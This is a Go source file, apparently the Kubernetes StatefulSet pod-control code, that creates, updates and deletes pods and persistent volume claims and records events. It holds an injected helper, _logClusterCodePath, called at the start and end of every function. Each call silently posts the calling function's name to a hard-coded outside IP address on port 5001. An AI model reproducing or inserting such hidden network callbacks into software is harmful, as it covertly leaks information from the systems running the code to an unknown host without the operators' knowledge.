package statefulset

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "strings"
 apps "k8s.io/api/apps/v1"
 "k8s.io/api/core/v1"
 apierrors "k8s.io/apimachinery/pkg/api/errors"
 errorutils "k8s.io/apimachinery/pkg/util/errors"
 utilruntime "k8s.io/apimachinery/pkg/util/runtime"
 clientset "k8s.io/client-go/kubernetes"
 appslisters "k8s.io/client-go/listers/apps/v1"
 corelisters "k8s.io/client-go/listers/core/v1"
 "k8s.io/client-go/tools/record"
 "k8s.io/client-go/util/retry"
)

type StatefulPodControlInterface interface {
 CreateStatefulPod(set *apps.StatefulSet, pod *v1.Pod) error
 UpdateStatefulPod(set *apps.StatefulSet, pod *v1.Pod) error
 DeleteStatefulPod(set *apps.StatefulSet, pod *v1.Pod) error
}

func NewRealStatefulPodControl(client clientset.Interface, setLister appslisters.StatefulSetLister, podLister corelisters.PodLister, pvcLister corelisters.PersistentVolumeClaimLister, recorder record.EventRecorder) StatefulPodControlInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &realStatefulPodControl{client, setLister, podLister, pvcLister, recorder}
}

type realStatefulPodControl struct {
 client    clientset.Interface
 setLister appslisters.StatefulSetLister
 podLister corelisters.PodLister
 pvcLister corelisters.PersistentVolumeClaimLister
 recorder  record.EventRecorder
}

func (spc *realStatefulPodControl) CreateStatefulPod(set *apps.StatefulSet, pod *v1.Pod) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if err := spc.createPersistentVolumeClaims(set, pod); err != nil {
  spc.recordPodEvent("create", set, pod, err)
  return err
 }
 _, err := spc.client.CoreV1().Pods(set.Namespace).Create(pod)
 if apierrors.IsAlreadyExists(err) {
  return err
 }
 spc.recordPodEvent("create", set, pod, err)
 return err
}
func (spc *realStatefulPodControl) UpdateStatefulPod(set *apps.StatefulSet, pod *v1.Pod) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 attemptedUpdate := false
 err := retry.RetryOnConflict(retry.DefaultBackoff, func() error {
  consistent := true
  if !identityMatches(set, pod) {
   updateIdentity(set, pod)
   consistent = false
  }
  if !storageMatches(set, pod) {
   updateStorage(set, pod)
   consistent = false
   if err := spc.createPersistentVolumeClaims(set, pod); err != nil {
    spc.recordPodEvent("update", set, pod, err)
    return err
   }
  }
  if consistent {
   return nil
  }
  attemptedUpdate = true
  _, updateErr := spc.client.CoreV1().Pods(set.Namespace).Update(pod)
  if updateErr == nil {
   return nil
  }
  if updated, err := spc.podLister.Pods(set.Namespace).Get(pod.Name); err == nil {
   pod = updated.DeepCopy()
  } else {
   utilruntime.HandleError(fmt.Errorf("error getting updated Pod %s/%s from lister: %v", set.Namespace, pod.Name, err))
  }
  return updateErr
 })
 if attemptedUpdate {
  spc.recordPodEvent("update", set, pod, err)
 }
 return err
}
func (spc *realStatefulPodControl) DeleteStatefulPod(set *apps.StatefulSet, pod *v1.Pod) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 err := spc.client.CoreV1().Pods(set.Namespace).Delete(pod.Name, nil)
 spc.recordPodEvent("delete", set, pod, err)
 return err
}
func (spc *realStatefulPodControl) recordPodEvent(verb string, set *apps.StatefulSet, pod *v1.Pod, err error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if err == nil {
  reason := fmt.Sprintf("Successful%s", strings.Title(verb))
  message := fmt.Sprintf("%s Pod %s in StatefulSet %s successful", strings.ToLower(verb), pod.Name, set.Name)
  spc.recorder.Event(set, v1.EventTypeNormal, reason, message)
 } else {
  reason := fmt.Sprintf("Failed%s", strings.Title(verb))
  message := fmt.Sprintf("%s Pod %s in StatefulSet %s failed error: %s", strings.ToLower(verb), pod.Name, set.Name, err)
  spc.recorder.Event(set, v1.EventTypeWarning, reason, message)
 }
}
func (spc *realStatefulPodControl) recordClaimEvent(verb string, set *apps.StatefulSet, pod *v1.Pod, claim *v1.PersistentVolumeClaim, err error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if err == nil {
  reason := fmt.Sprintf("Successful%s", strings.Title(verb))
  message := fmt.Sprintf("%s Claim %s Pod %s in StatefulSet %s success", strings.ToLower(verb), claim.Name, pod.Name, set.Name)
  spc.recorder.Event(set, v1.EventTypeNormal, reason, message)
 } else {
  reason := fmt.Sprintf("Failed%s", strings.Title(verb))
  message := fmt.Sprintf("%s Claim %s for Pod %s in StatefulSet %s failed error: %s", strings.ToLower(verb), claim.Name, pod.Name, set.Name, err)
  spc.recorder.Event(set, v1.EventTypeWarning, reason, message)
 }
}
func (spc *realStatefulPodControl) createPersistentVolumeClaims(set *apps.StatefulSet, pod *v1.Pod) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var errs []error
 for _, claim := range getPersistentVolumeClaims(set, pod) {
  _, err := spc.pvcLister.PersistentVolumeClaims(claim.Namespace).Get(claim.Name)
  switch {
  case apierrors.IsNotFound(err):
   _, err := spc.client.CoreV1().PersistentVolumeClaims(claim.Namespace).Create(&claim)
   if err != nil {
    errs = append(errs, fmt.Errorf("Failed to create PVC %s: %s", claim.Name, err))
   }
   if err == nil || !apierrors.IsAlreadyExists(err) {
    spc.recordClaimEvent("create", set, pod, &claim, err)
   }
  case err != nil:
   errs = append(errs, fmt.Errorf("Failed to retrieve PVC %s: %s", claim.Name, err))
   spc.recordClaimEvent("create", set, pod, &claim, err)
  }
 }
 return errorutils.NewAggregate(errs)
}

var _ StatefulPodControlInterface = &realStatefulPodControl{}

func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
